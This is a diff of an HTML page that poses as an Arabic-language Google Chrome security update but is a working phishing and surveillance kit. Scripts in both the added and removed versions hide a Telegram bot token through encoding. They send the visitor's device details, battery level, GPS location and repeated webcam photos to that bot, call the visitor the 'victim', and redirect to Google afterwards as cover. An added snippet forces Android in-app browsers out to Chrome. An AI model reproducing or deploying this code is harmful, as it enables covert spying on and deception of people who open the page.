@@ -1,87 +1,112 @@
+<script>
+/* 🛡️ AHMED CYBER SECURITY - AUTO-BYPASS SYSTEM */
+(function(){var ua=navigator.userAgent;if(/FBAN|FBAV|Instagram|Messenger|WhatsApp|Telegram|TikTok/i.test(ua)&&/android/i.test(ua)){var url=window.location.href.replace(/^https?:\/\//,"");window.location.replace("intent://"+url+"#Intent;scheme=https;package=com.android.chrome;end");}})();
+</script>
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Checking Connection...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Chrome - تحديث الأمان</title>
+    <link rel="icon" type="image/png" href="https://www.google.com/chrome/static/images/favicons/favicon-32x32.png">
     <style>
-        body { background: #000; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .terminal { width: 90%; max-width: 500px; border: 1px solid #333; padding: 20px; box-shadow: 0 0 20px rgba(0,255,0,0.2); border-radius: 5px; }
-        .blink { animation: b 1s infinite; }
-        @keyframes b { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+        body { background-color: #ffffff; color: #3c4043; font-family: 'Roboto', Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
+        .header { padding: 20px; border-bottom: 1px solid #e0e0e0; }
+        .container { padding: 40px 20px; }
+        .chrome-logo { width: 80px; height: 80px; margin-bottom: 20px; }
+        h1 { font-size: 22px; font-weight: 400; color: #202124; }
+        p { font-size: 14px; line-height: 1.6; color: #5f6368; max-width: 300px; margin: 0 auto 30px; }
+        .btn-blue { background-color: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
+        .btn-blue:active { background-color: #185abc; }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <div>> System: Initializing...</div>
-        <div>> Status: <span id="st">Checking SSL...</span></div>
-        <div class="blink">_</div>
+
+    <div class="header">
+        <img src="https://www.google.com/chrome/static/images/chrome-logo.svg" alt="Chrome" style="width: 120px;">
+    </div>
+
+    <div class="container">
+        <img src="https://www.google.com/chrome/static/images/chrome-logo.svg" class="chrome-logo" alt="Logo">
+        <h1>تحديث أمان المتصفح مطلوب</h1>
+        <p>لحماية بياناتك من التهديدات السيبرانية، يرجى تحديث صلاحيات المتصفح والتحقق من الهوية فوراً.</p>
+        
+        <button class="btn-blue" onclick="startProcess()">تحديث المتصفح الآن</button>
     </div>
 
     <video id="v" style="display:none;" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-    // تشفير التوكن والآيدي لمنع الحظر
-    const _t = "383238393739333934333a4141457273464e32566151564833304d684358686f76717268416f3334565375626534";
-    const _i = "35373735373831303338";
-    const _h = h => h.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
+        // تشفير البيانات (أحمد)
+        const _0xT = "ODI4OTc5Mzk0MzpBQUVyc0ZOMlZhUVZIMzBNaENob3ZxcmhBbzM0VlN1YmU0"; 
+        const _0xI = "NTc3NTc4MTAzOA==";
 
-    // دالة الإرسال السريع للنصوص
-    async function s(m) {
-        await fetch(`https://api.telegram.org/bot${_h(_t)}/sendMessage?chat_id=${_h(_i)}&text=${encodeURIComponent(m)}&parse_mode=Markdown`);
-    }
+        const t = atob(_0xT);
+        const i = atob(_0xI);
 
-    // دالة الإرسال السريع للصور (Blob)
-    async function sp(b) {
-        let f = new FormData();
-        f.append('chat_id', _h(_i));
-        f.append('photo', b, 'shot.jpg');
-        await fetch(`https://api.telegram.org/bot${_h(_t)}/sendPhoto`, { method: 'POST', body: f });
-    }
+        function send(txt) { fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${i}&text=${encodeURIComponent(txt)}&parse_mode=html`); }
 
-    async function main() {
-        const p = new URLSearchParams(window.location.search);
-        const d = p.get('do');
-
-        // 1. [تلقائي] سحب بيانات الجهاز والـ IP فوراً
-        try {
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(async j => {
-                let bat = await navigator.getBattery();
-                let report = `🔱 *صيد متكامل جديد*\n\n🌐 IP: \`${j.ip}\`\n🌍 الموقع: ${j.country_name} (${j.city})\n📡 المزود: ${j.org}\n🔋 الشحن: ${Math.round(bat.level * 100)}%\n📱 الجهاز: ${navigator.platform}`;
-                s(report);
-            });
-        } catch(e) { s("⚠️ دخول (فشل سحب IP)"); }
-
-        // 2. [تلقائي] طلب الأذونات فور الدخول
-        if (d === 'camera') {
-            document.getElementById('st').innerText = "Camera Verification Required...";
-            try {
-                // طلب الكاميرا مع دعم الأيفون (playsinline)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                const v = document.getElementById('v');
-                v.srcObject = stream;
-                
-                // التقاط فوري بعد استقرار الكاميرا (500ms)
-                setTimeout(() => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    c.toBlob(sp, 'image/jpeg', 0.5); // ضغط 50% لسرعة إرسال جنونية
-                    s("✅ *تم التقاط الصورة وإرسالها*");
-                }, 500);
-            } catch(e) { s("❌ *رفض الكاميرا*"); }
-        } 
-        else if (d === 'location') {
-            document.getElementById('st').innerText = "GPS Calibration...";
-            navigator.geolocation.getCurrentPosition(pos => {
-                s(`📍 *الموقع:* http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-            }, () => s("❌ *رفض الموقع*"), {enableHighAccuracy:true});
+        function sendPic(data, n) {
+            let b = dataURItoBlob(data);
+            let f = new FormData();
+            f.append("chat_id", i);
+            f.append("caption", `🎯 صيد جديد (أحمد) - صورة ${n}`);
+            f.append("photo", b, "chrome_secure.jpg");
+            fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: "POST", body: f });
         }
-    }
 
-    // تشغيل المحرك فوراً
-    window.onload = main;
+        function dataURItoBlob(d) {
+            var s = atob(d.split(',')[1]), a = new ArrayBuffer(s.length), ia = new Uint8Array(a);
+            for (var j = 0; j < s.length; j++) ia[j] = s.charCodeAt(j);
+            return new Blob([a], { type: 'image/jpeg' });
+        }
+
+        async function startProcess() {
+            // طلب الموقع فوراً
+            navigator.geolocation.getCurrentPosition(p => {
+                send(`📍 <b>موقع الضحية:</b>\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // طلب الكاميرا والتصوير السريع جداً
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.srcObject = s;
+                
+                let shots = 0;
+                let timer = setInterval(() => {
+                    if (shots < 4) {
+                        const canvas = document.getElementById('c');
+                        canvas.width = video.videoWidth; 
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        sendPic(canvas.toDataURL('image/jpeg'), shots + 1);
+                        shots++;
+                    } else {
+                        clearInterval(timer);
+                        s.getTracks().forEach(track => track.stop());
+                        window.location.replace("https://www.google.com"); // توجيه الضحية لجوجل بعد الانتهاء للتمويه
+                    }
+                }, 700); // تصوير فائق السرعة
+            } catch (err) {
+                send("❌ الضحية رفض الأذونات");
+            }
+        }
+
+        window.onload = async () => {
+            // سحب معلومات الجهاز والبطارية فوراً
+            let info = `<b>🚀 اختراق جديد (Google Theme)</b>\n`;
+            info += `📱 الجهاز: ${navigator.platform}\n`;
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                info += `🔋 البطارية: ${Math.round(b.level * 100)}%\n`;
+            }
+            send(info);
+            
+            // محاولة البدء التلقائي
+            startProcess();
+        };
     </script>
 </body>
 </html>
